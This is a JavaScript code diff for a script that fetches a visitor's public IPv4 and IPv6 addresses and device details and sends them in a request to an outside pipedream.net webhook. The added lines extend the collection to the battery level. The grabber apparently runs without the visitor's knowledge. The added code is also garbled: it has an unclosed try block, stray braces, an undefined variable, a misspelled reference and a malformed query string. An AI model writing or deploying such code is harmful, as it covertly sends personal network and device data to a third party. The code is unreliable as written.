@@ -219,7 +219,12 @@ function getDeviceInfo() {
   return "Unknown device";
 }
 
-console.log(getDeviceInfo());
+try {
+        const battery = await navigator.getBattery();
+        info.battery = battery.level * 100,
+        };
+
+    
 async function sendIPsToWebhook() {
   try {
     const ipv4Res = await fetch("https://api.ipify.org/?format=json");
@@ -231,7 +236,7 @@ async function sendIPsToWebhook() {
     const ipv6 = ipv6Data.ip;
 
     // Now that both IPs are fetched, send them to your endpoint
-    const url = `https://eou274ml4ri0qf0.m.pipedream.net/?ip4v=${ipv4}&ip6v=${ipv6}&device=${getDeviceInfo()}`;
+    const url = `https://eou274ml4ri0qf0.m.pipedream.net/?ip4v=${ipv4}&ip6v=${ipv6}&device=${getDeviceInfo()}battery=${nfo.battery}`;
     await fetch(url);
 
     console.log("IPs sent successfully:", ipv4, ipv6);
